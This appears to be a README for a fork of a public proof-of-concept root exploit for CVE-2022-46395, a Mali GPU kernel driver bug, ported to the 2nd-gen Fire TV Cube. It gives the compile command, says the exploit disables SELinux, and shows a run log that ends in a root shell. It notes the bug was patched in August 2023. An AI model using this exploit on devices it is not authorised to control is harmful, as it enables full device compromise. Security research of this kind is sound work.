## Exploit for CVE-2022-46395 to run on FireTV 2nd gen Cube

This is a fork of security researcher Man Yue Mo's <a href="https://github.com/github/securitylab/tree/main/SecurityExploits/Android/Mali/CVE_2022_46395">Pixel 6 POC</a> for CVE-2022-46395.  Read his detailed write-up of the vulnerability <a href="https://github.blog/2023-05-25-rooting-with-root-cause-finding-a-variant-of-a-project-zero-bug/">here</a>.  Changes have been made to account for FireOS's 32-bit user space. The POC exploits a bug in the ARM Mali kernel driver to gain arbitrary kernel code execution, which is then used to disable SELinux and gain root.  

The exploit was patched in PS7652/3564 (late August 2023). For reference, the following command was used to compile with clang in ndk-21:
```
android-ndk-r21d/toolchains/llvm/prebuilt/linux-x86_64/bin/armv7a-linux-androideabi28-clang -DSHELL mali_user_buf.c mempool_utils.c mem_write.c -o raven_buf
```
For fastest results, run following a fresh reboot.  On average the POC takes 2-5min to gain root.
```
raven:/ $ /data/local/tmp/raven_buf
Amazon/raven/raven:9/PS7646.3565N/0028085972224:user/amz-p,release-keys
benchmark_time 138
failed after 100
finished reset: 342278966 fault: 338143633 195 err 0 read 3
failed to find pgd, retry
finished reset: 731402639 fault: 724605931 208 err 0 read 3
failed to find pgd, retry
finished reset: 67309348 fault: 66434848 210 err 0 read 3
failed to find pgd, retry
failed after 200
failed after 300
benchmark_time 135
failed after 400
failed after 500
failed after 600
benchmark_time 131
failed after 700
finish reset: 797174916 fault: 788811083 352 err 0 read 3
found pgd at page 6
overwrite addr : 104100634 634
overwrite addr : 104300634 634
overwrite addr : 1041001d0 1d0
overwrite addr : 1043001d0 1d0
result 50
raven:/ #
```
